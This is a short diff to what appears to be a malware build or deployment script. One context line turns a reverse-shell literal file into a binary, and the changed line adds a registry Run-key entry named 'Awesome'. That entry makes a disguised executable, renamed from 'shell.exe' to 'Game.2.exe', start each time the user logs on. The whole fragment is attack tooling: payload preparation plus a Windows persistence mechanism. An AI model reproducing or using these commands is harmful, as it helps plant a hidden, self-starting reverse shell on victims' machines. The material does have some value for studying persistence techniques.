@@ -1,3 +1,3 @@
 echo -ne "$(cat shelliteral/reverseshell_local.txt)" > shelliteral/reverseshell_local.bin
 
-REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Awesome" /t REG_SZ /F /D "C:\Users\malwa\Documents\Game_expl\shell.exe"
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Awesome" /t REG_SZ /F /D "C:\Users\malwa\Donwloads\Personal\Game.2.exe"
